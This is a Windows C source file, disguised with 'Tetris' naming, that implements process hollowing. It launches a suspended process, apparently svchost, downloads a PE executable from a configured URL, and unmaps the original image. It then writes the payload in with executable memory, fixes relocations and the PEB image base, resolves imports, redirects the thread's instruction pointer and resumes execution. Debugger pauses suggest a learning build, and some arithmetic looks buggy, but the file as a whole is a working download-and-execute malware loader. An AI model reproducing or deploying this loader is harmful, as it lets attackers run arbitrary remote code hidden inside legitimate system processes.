#include <stdlib.h>
#include <ctype.h>
#include <stdio.h>
#include <memory.h>
#include <windows.h>
#include <wininet.h>
#include "tetris.h"
#include "ntdll_imit.h"
#include "config.h"

PROCESS_INFORMATION spawn(char *processPath){
STARTUPINFOA stInfo={0};
stInfo.cb=sizeof(stInfo);
PROCESS_INFORMATION pInfo={0};
if(CreateProcessA(
processPath,
NULL,
NULL,
NULL,
FALSE,
CREATE_SUSPENDED | CREATE_NO_WINDOW,
NULL,
NULL,
&stInfo,
&pInfo
))
return pInfo;
else
printf("[-] CreateProcessA %lu\n",GetLastError());
exit(1);
}

BYTE* fetchPE(char* url){

    // general initialization fn
    HINTERNET internet=InternetOpenA(
        "JAMES/BOND/007",
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL,
        NULL,
        0 // no async
    );
    if(!internet){
        printf("[-] InternetOpenA()\n");
        exit(1);
    }
    HINTERNET hurl=InternetOpenUrlA(
        internet,
        URL,
        NULL,
        0,
        INTERNET_FLAG_RELOAD,
        0
    );
    if(!hurl){
        printf("[-] InternetOpenUrlA() %lu\n",GetLastError());
        exit(1);
    }

    DWORD sz=4096;
    BYTE* pe=(BYTE*)malloc(sz);
    BYTE* offset=pe;
    DWORD totalRead=0;
    DWORD cycleRead=0;

    while(InternetReadFile(
        hurl,
        offset,
        sz, 
        &cycleRead
    ) && cycleRead>0){
        totalRead+=cycleRead;
        void*tmp=realloc(pe,totalRead+sz);
        if(tmp)
         pe=tmp;
        offset=(BYTE*)(pe+totalRead);
    }
    void*tmp=realloc(pe,totalRead);
    if(tmp)
     pe=tmp;
    return pe;
}


extern MappingMetadata PEParser(BYTE* pe){
    // works entirely on heap
    MappingMetadata mm;
    mm.heapBase=pe;
    unsigned long long  p_NT_HEADERS=(unsigned long long)(pe+*(pe+0x3c));
    unsigned long long p_FILE_HEADERS=(unsigned long long)(p_NT_HEADERS+0x4);
    unsigned long long p_OPT_HEADERS=(unsigned long long)(p_NT_HEADERS+0x18);
    mm.preferedBase=*(unsigned long long*)(p_OPT_HEADERS+0x18);
    mm.RVAAddressOfEntryPoint=*(unsigned long *)(p_OPT_HEADERS+0x10);   
    mm.headersSize=*(unsigned long*)(p_OPT_HEADERS+0x3c);
    mm.imageSize=*(unsigned long*)(p_OPT_HEADERS+0x38);
    unsigned long dataDirectoriesCount=*(unsigned long*)(p_OPT_HEADERS+0x6c);
    // important
    mm.ImageSectionsCount=*(unsigned short*)(p_FILE_HEADERS+0x2);
    unsigned short optHeadersSz=*(unsigned short*)(p_FILE_HEADERS+0x10);
    // sizeof(IMAGE_SECTION_HEADER) = 40 bytes
    IMAGE_SECTION_HEADER* p_SECTION_HEADER=(IMAGE_SECTION_HEADER*)(p_NT_HEADERS+0x4+0x14+optHeadersSz);
    mm.ImageSectionHeaders=(unsigned long long )p_SECTION_HEADER;
    // extracting section alignmnet (crucial for mapping)
    mm.sectionAlignment=*(unsigned long*)(p_OPT_HEADERS+0x20);
    mm.dataDirectoryList=(unsigned long long)(p_OPT_HEADERS+0x70);
   
    return mm;
}



extern char* mapRoutineX(HANDLE proc,MappingMetadata mm,IMAGE_SECTION_HEADER **reloc){
    char* remoteV=(char*)VirtualAllocEx(
        proc,
        (void*)mm.preferedBase,
        (SIZE_T)mm.imageSize,
        MEM_COMMIT | MEM_RESERVE,
        0x40
    );

    if(!remoteV)
        remoteV=(char*)VirtualAllocEx(
            proc,
            NULL,
            (SIZE_T)mm.imageSize,
            MEM_COMMIT | MEM_RESERVE,
            0x40
        );

    bool prefAlloc=false;
    if((unsigned long long)remoteV == (unsigned long long)mm.preferedBase)
        prefAlloc=true;

    printf("new base address of target process/dll: %lu\n",remoteV);

    if(WriteProcessMemory(
        proc,
        remoteV,
        mm.heapBase,
        mm.headersSize,
        NULL
    )){
        printf("headers has been written. check with debugger. then enter to continue\n");
        getchar();
    };
    

    
    IMAGE_SECTION_HEADER* sec=(IMAGE_SECTION_HEADER*)mm.ImageSectionHeaders;
    unsigned long _sz=sizeof(IMAGE_SECTION_HEADER); // 40 bytes in x64 PE

    for(int i=0; i<mm.ImageSectionsCount; i++){
    char* name=(char*)(sec->Name);
    
    if(strcmp(name,".reloc")==0 && !prefAlloc){
        printf(".reloc ---- %i|||| base: %llu\n",sec->SizeOfRawData,(unsigned long long)sec);
        *reloc=sec;
        sec++;
        continue;
    }

    unsigned int protections=sec->Characteristics;
    unsigned int rva_raw=sec->PointerToRawData;
    unsigned int rva_virt=sec->VirtualAddress;

    // section size on disk (multiply of file alignment)
    unsigned long secRsz=sec->SizeOfRawData;
    // actual content size which should be alligned to section alignment
    // alignment is done by loader only when it maps subsection of IMAGE to 
    // va space.
    // i allocate contigious va space, so does not
    unsigned long _virtualSize=*(unsigned long*)((BYTE*)sec+0x8);

    printf("%s --- size on disk: %i | size in VA: %i\n",name,secRsz,_virtualSize);

    void* va=remoteV+rva_virt;
    void* raw=mm.heapBase+rva_raw;
    unsigned long long written=0;  
   
    if(!WriteProcessMemory(
        proc,
        va,
        raw,
        _virtualSize,
        &written
    )){
        printf("[-] 144 failed  to write section to p mem\n");
        exit(1);
    }

    DWORD oldProt=0;
    DWORD newProtection=0;

    if((protections & IMAGE_SCN_MEM_EXECUTE)==IMAGE_SCN_MEM_EXECUTE){
        newProtection=PAGE_EXECUTE_READ;
    }
    else if(((protections & IMAGE_SCN_MEM_READ)==IMAGE_SCN_MEM_READ) && (protections & IMAGE_SCN_MEM_WRITE)==IMAGE_SCN_MEM_WRITE){
        newProtection=PAGE_READWRITE;
    }
    else{
        newProtection=PAGE_READONLY;
    }

    VirtualProtectEx(
        proc,
        va,
        _virtualSize,
        newProtection,
        &oldProt
    );
    printf("written to %s --- %llu bytes\n",name,written);
    if(written!=(unsigned long)_virtualSize){
        printf("[-] 235!\n");
        exit(1);
    }
    sec++;
    }
    printf("all sections has been mapped!\n");
    return remoteV;
}


extern void rellocate(HANDLE proc,void* remoteImageBase,void* heapBase,void* preferedBase,IMAGE_SECTION_HEADER *sec){
    printf("RELLOC STARTED\n");
    // reloction block in heap (first el in list)
    BYTE* _block=(BYTE*)((BYTE*)heapBase+(unsigned int)(sec->PointerToRawData));
    
    unsigned int secSz=sec->SizeOfRawData;
    printf(".reloc ---- %i\n",secSz);
    
    long long delta = (long long)(uintptr_t)remoteImageBase - (long long)(uintptr_t)preferedBase;
    unsigned int parsedBytes=0;
    while(parsedBytes<secSz){
        IMAGE_BASE_RELOCATION* block=(IMAGE_BASE_RELOCATION*)_block;

        unsigned int blockSz=block->SizeOfBlock;
        if(blockSz==0)
            break;
        unsigned int pageRva=block->VirtualAddress;
        
        printf("block size: %i\n",blockSz);
        // this block works on given page
        uintptr_t page=(uintptr_t)((unsigned long long)remoteImageBase+pageRva);
        printf("relocation process for page: %llu\n",page);
        
        unsigned int entriesCount=(blockSz-8)/2;
        printf("entreis count: %i\n",entriesCount);

        WORD* entry=(WORD*)((BYTE*)block+8);

        for(unsigned int j=0;j<entriesCount;j++){
            
            BYTE relocType=*entry>>12;
            WORD offset=*entry & 0x0FFF;
            
            if(relocType==3 || relocType==10){
                uintptr_t absolute=page+offset;
                uintptr_t relocated = (uintptr_t)((long long)absolute + delta - (long long)(uintptr_t)preferedBase);
                printf("before relocation: %p ---- after relocation: %p\n",absolute,relocated);

                if(!WriteProcessMemory(
                    proc,
                    (void*)absolute,
                    &relocated,
                    sizeof(unsigned long long),
                    NULL
                )){
                    printf("[-] 186!\n");
                    exit(1);
                }
            }
            entry++;
        }
        parsedBytes+=blockSz;
        _block+=blockSz;
    }
    printf("relocated successfuly!\n");
}

extern void lowercase(char* str){
    for(int i=0;i<strlen(str);i++){
        char lowered=tolower(str[i]);
        str[i]=lowered;
    }
}

extern bool syncLoadedDlls(char* dll,__uint64_t dllBase,__uint64_t exportDirBase, DLL** dllList,size_t *count){
// dll is on heap
++(*count);
DLL* tmp=realloc(*dllList,(*count)*sizeof(DLL));
if(tmp!=NULL)
    *dllList=tmp;
else 
    exit(1);
(*dllList)[*count-1].dll_name=dll;
(*dllList)[*count-1].exportDirBase=exportDirBase;
(*dllList)[*count-1].dll_base=dllBase;
// finish tthis 
printf("DLL added to loaded dlls list\n");
return true;
}


extern void dumpLoadedDlls(DLL* dllList,size_t* count){
    printf("LOADED DLL LIST: \n");
    for(unsigned int i=0;i<(*count);i++)
        printf("%i) %s ---- Export Directory Base: %p\n",i+1,dllList[i].dll_name,dllList[i].exportDirBase);

}


extern DLL* isDllLoaded(char* dll,DLL* loaded_list,size_t* count){
    for(unsigned int i=0;i<*count;i++)
        if(strcmp(dll,loaded_list[i].dll_name)==0)
            return (DLL*)((DLL*)loaded_list+i);
    return NULL;

}

extern void ReadRemoteString(HANDLE proc,__uint64_t remoteAddr,char* local){
    int readChar=0;
    while (true)
    {
        char c='';
        ReadProcessMemory(proc,(void*)(remoteAddr),&c,sizeof(char),NULL);
        *(local+readChar)=c;
        if(!c)
            break;
        readChar++;
    }

}

static bool ReadRemoteMemory(HANDLE proc,LPCVOID remoteAddress, LPVOID localBuffer, SIZE_T size) {
    SIZE_T bytesRead = 0;
    return ReadProcessMemory(proc, remoteAddress, localBuffer, size, &bytesRead) && (bytesRead == size);
}

extern __uint64_t extractImageExportTableBase(HANDLE proc,BYTE* imageBase) {
    if (!imageBase) return 0;
    IMAGE_DOS_HEADER dosHeader;
    if (!ReadRemoteMemory(proc,imageBase, &dosHeader, sizeof(IMAGE_DOS_HEADER))) 
        return 0;
    if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) 
        return 0; 
    BYTE* ntHeadersPtr = imageBase + dosHeader.e_lfanew;
    IMAGE_NT_HEADERS32 ntHeaders32;
    if (!ReadRemoteMemory(proc,ntHeadersPtr, &ntHeaders32, sizeof(IMAGE_NT_HEADERS32))) {
        return 0;
    }
    if (ntHeaders32.Signature != IMAGE_NT_SIGNATURE) {
        return 0; 
    }
    DWORD exportDirRVA = 0;
    if (ntHeaders32.OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        IMAGE_NT_HEADERS64 ntHeaders64;
        if (!ReadRemoteMemory(proc,ntHeadersPtr, &ntHeaders64, sizeof(IMAGE_NT_HEADERS64))) {
            return 0;
        }
        exportDirRVA = ntHeaders64.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    } 
    else if (ntHeaders32.OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        exportDirRVA = ntHeaders32.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    } 
    else {
        return 0; 
    }

    if (exportDirRVA == 0) {
        return 0; 
    }

    return (__uint64_t)(imageBase+exportDirRVA);
}

void _adj_CPU_REGISTERS_(HANDLE thread,DWORD rip){
    CONTEXT thContext;
    if(!GetThreadContext(thread,&thContext))
        printf("[-] 288!\n");
    thContext.Rip=rip;
    if(!SetThreadContext(thread,&thContext))
        printf("[-] 293!\n");
}


bool hallowAndStart(HANDLE proc,HANDLE thread,BYTE* pe){
HANDLE self=GetCurrentProcess();
HMODULE ntdll=GetModuleHandleA("ntdll");
T_NtQueryInformationProcess NtQueryInformationProcess=(T_NtQueryInformationProcess)GetProcAddress(ntdll,"NtQueryInformationProcess");
T_NtUnmapViewOfSection NtUnmapViewOfSection=(T_NtUnmapViewOfSection)GetProcAddress(ntdll,"NtUnmapViewOfSection");
T_NtCreateSection NtCreateSection=(T_NtCreateSection)GetProcAddress(ntdll,"NtCreateSection");

PROCESS_BASIC_INFORMATION self_pinfo;
unsigned long sz=sizeof(self_pinfo);
    if(NtQueryInformationProcess(
        GetCurrentProcess(),
        ProcessBasicInformation,
        &self_pinfo,
        sz,
        &sz
    )!=0)
        NtQueryInformationProcess(
        GetCurrentProcess(),
        ProcessBasicInformation,
        &self_pinfo,
        sz,
        &sz
    );

    BYTE* selfPEB=self_pinfo.PebBaseAddress;


 PROCESS_BASIC_INFORMATION pinfo;
 ULONG requiredSize=sizeof(pinfo);
if(NtQueryInformationProcess(
    proc,
   ProcessBasicInformation,
   &pinfo,
   requiredSize,
   &requiredSize
)!=0){
    NtQueryInformationProcess(
    proc,
   ProcessBasicInformation,
   &pinfo,
   requiredSize,
   &requiredSize
);
}
// stores address of PEB. only makes sense within VA space of remote process. not here
void* baseAddrAddr=(void*)((BYTE*)pinfo.PebBaseAddress+0x10);
uintptr_t baseAddr=0;
ReadProcessMemory(proc,baseAddrAddr,&baseAddr,sizeof(PVOID),NULL);
if(NtUnmapViewOfSection(proc,(void*)baseAddr)!=0){
    printf("[-] NtUnmapViewOfSection()!\n");
    exit(1);
} // disassociates VA region from section object


printf("section object has been unmaped. you can check via debugger and then press enter to continue \
        program execution!\n");

getchar();

printf("continiueueueuing execution\n");


MappingMetadata mm=PEParser(pe);
printf(
    "heap base: %llu | prefered base: %llu | image size: %lu | headers size: %lu\n",
    mm.heapBase,mm.preferedBase,mm.imageSize,mm.headersSize
);


IMAGE_SECTION_HEADER *reloc=NULL;
char* remoteV=NULL;
if(!KERNEL_STYLE){
    remoteV=mapRoutineX(proc,mm,&reloc); // ELSE mapRoutineY();
    printf("sections has been mapped! check with debugger\n");
    getchar();
}

if(reloc!=NULL)
    rellocate(proc,(void*)remoteV,(void*)mm.heapBase,(void*)mm.preferedBase,reloc);

// adjusting image base in remote PEB

if(!WriteProcessMemory(
    proc,
    baseAddrAddr,
    (void*)&remoteV,
    sizeof(unsigned long long),
    NULL
)){
    printf("PEB CANT BE ADJUSTED!\n");
    exit(1);
}

char* native="ntdll.dll";
size_t count=1;
DLL* loadedDlls=malloc(sizeof(DLL)*count);
loadedDlls->dll_name=native;
loadedDlls->exportDirBase=extractImageExportTableBase(proc,(BYTE*)ntdll);

resolveIAT(proc,pinfo,remoteV,&loadedDlls,&count,"Main PE");

dumpLoadedDlls(loadedDlls,&count);


uintptr_t entryPont=(uintptr_t)(remoteV+mm.RVAAddressOfEntryPoint);

printf("address of entry point is: %p\n",(void*)entryPont);
printf("address of entry point is: %llu\n",entryPont);


printf("ENTRY POINT: %llu\n",entryPont);
_adj_CPU_REGISTERS_(thread,(DWORD)entryPont);

printf("PRESS ENT TO RESUME THREAD!\n");
getchar();

if(ResumeThread(thread)!=-1){
    printf("main thread started!\n");
    return true;
}
return false;
}

bool __0x1FN3C3SS4RY__(){
    PROCESS_INFORMATION proc_info=spawn(PROCESS);
    printf("CHECK PROCESS WITH DEBUGGER BEFORE UNMAP //// SVCHOST PID: %i\n",proc_info.dwProcessId);
    getchar();
    HANDLE hProc=proc_info.hProcess;
    HANDLE hMainThread=proc_info.hThread;
    BYTE* pe=fetchPE(URL); // returns heap base 
    bool cool=hallowAndStart(hProc,hMainThread,pe);
    if(cool)
        return true;
    exit(1);
}
extern bool initializeTetrix(){
  return __0x1FN3C3SS4RY__();
}


int main(){
    initializeTetrix();
    return 0;
}



// section object mappnig approach
// void mapRoutineY(){
// HANDLE pe_headers_section;
// NtCreateSection(
// &pe_headers_section,
// SECTION_ALL_ACCESS,
// NULL,
// mm.headersSize,
// PAGE_READWRITE,
// SEC_COMMIT,
// NULL
// );
// if(!pe_headers_section){
//     printf("[-]NtCreateSection for PE HEADERS MAPPNG!\n");
//     exit(1);
// }

// void* mapped=NULL;
// if(NtMapViewOfSection(
//     pe_headers_section,
//     self,
//     mapped,
//     0,
//     0,
//     NULL,
//     (unsigned long*)&mm.headersSize,
//     PAGE_READWRITE
// )!=0 && !mapped){
//     printf("[-] NtMapViewOfSection. 168\n");
//     exit(1);
// }
// memcpy(mapped,mm.heapBase,mm.headersSize);

// void *remoteBase=NULL;
// if(NtMapViewOfSection(
//     pe_headers_section,
//     proc,  
//     remoteBase
//     0,
//     0,
//     NULL,
//     (unsigned long*)&mm.headersSize,
//     PAGE_READWRITE
// )!=0 && !mapped){
//     printf("[-] NtMapViewOfSection. 168\n");
//     exit(1);
// }
// }